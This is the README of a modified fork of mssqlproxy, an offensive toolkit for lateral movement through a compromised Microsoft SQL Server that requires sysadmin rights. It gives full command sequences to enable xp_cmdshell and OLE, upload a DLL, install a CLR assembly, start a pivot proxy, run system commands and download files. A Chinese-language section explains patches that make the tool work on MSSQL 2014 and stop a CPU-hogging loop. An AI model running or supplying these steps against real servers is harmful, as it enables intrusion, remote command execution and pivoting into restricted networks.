# mssqlproxy

**mssqlproxy** is a toolkit aimed to perform lateral movement in restricted environments through a compromised Microsoft SQL Server via socket reuse. The client requires [impacket](https://github.com/SecureAuthCorp/impacket) and **sysadmin** privileges on the SQL server.


Please read [this article](https://www.blackarrow.net/mssqlproxy-pivoting-clr/) carefully before continuing.

```
proxy mode:
  -reciclador path      Remote path where DLL is stored in server
  -install              Installs CLR assembly
  -uninstall            Uninstalls CLR assembly
  -check                Checks if CLR is ready
  -start                Starts proxy
  -local-port port      Local port to listen on
  -clr local_path       Local CLR path
  -no-check-src-port    Use this option when connection is not direct (e.g. proxy)
```

We have also implemented two commands (within the SQL shell) for downloading and uploading files. Relating to the proxy stuff, we have four commands:

* **install**: Creates the CLR assembly and links it to a stored procedure. You need to provide the `-clr` param to read the generated CLR from a local DLL file.
* **uninstall**: Removes what **install** created.
* **check**: Checks if everything is ready to start the proxy. Requires to provide the server DLL location (`-reciclador`), which can be uploaded using the **upload** command.
* **start**: Starts the proxy. If `-local-port` is not specified, it will listen on port 1337/tcp.
[![asciicast](https://asciinema.org/a/298949.svg)](https://asciinema.org/a/298949)

**Note #1:** if using a non-direct connection (e.g. proxies in between), the `-no-check-src-port` flag is needed, so the server only checks the source address.

**Note #2:** at the moment, only IPv4 targets are supported (nor DNS neither IPv6 addresses).

**Note #3:** use carefully! by now the MSSQL service will crash if you try to establish multiple concurrent connections

**Important:** It's important to stop the mssqlproxy by pressing Ctrl+C on the client. If not, the server may crash and you will have to restart the MSSQL service manually.

Example
------------

Prepare
```bash
python3 mssqlclient.py $username:$password@$ip_mssql
SQL> enable_xp_cmdshell
SQL> enable_ole
SQL> upload reciclador.dll c:\programdata\reciclador.dll
SQL> exit
```

Proxy
```bash
python3 mssqlclient.py $username:$password@$ip_mssql -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py $username:$password@$ip_mssql -check -reciclador 'c:\programdata\reciclador.dll'
python3 mssqlclient.py $username:$password@$ip_mssql -start -reciclador 'c:\programdata\reciclador.dll'
```

xp_cmdshell
```bash
SQL> xp_cmdshell whoami /all
```
download file
```
download c:\xx.zip xx.zip
```
Base
------------
https://github.com/iptL-F4ck/mssqlproxy/


Change
------------
217 line of mssqlclient.py
```
SET @ip=TRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address')));
change to
SET @ip=LTRIM(RTRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address'))));
```
103 line of reciclador.cpp
```
return 1;
change to
return -1;
```

Why modify
------------
mssqlclient.py：在mssql2017之后才新增的TRIM函数，绕过mssql小于2017则会报错，仅在mssql2014测试。
![image](https://user-images.githubusercontent.com/102639729/224523965-8e22b17f-00ac-4446-9782-f8042c5453ac.png)

reciclador.cpp：如果python脚本意外退出，该dll会陷入死循环从而导致CPU占用100%。
![image](https://user-images.githubusercontent.com/102639729/224523979-ec109327-d721-415f-9a7c-61e5e62e38d0.png)




License
-------

All the code included in this project is licensed under the terms of the GPL license. The mssqlclient.py is based on [Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).
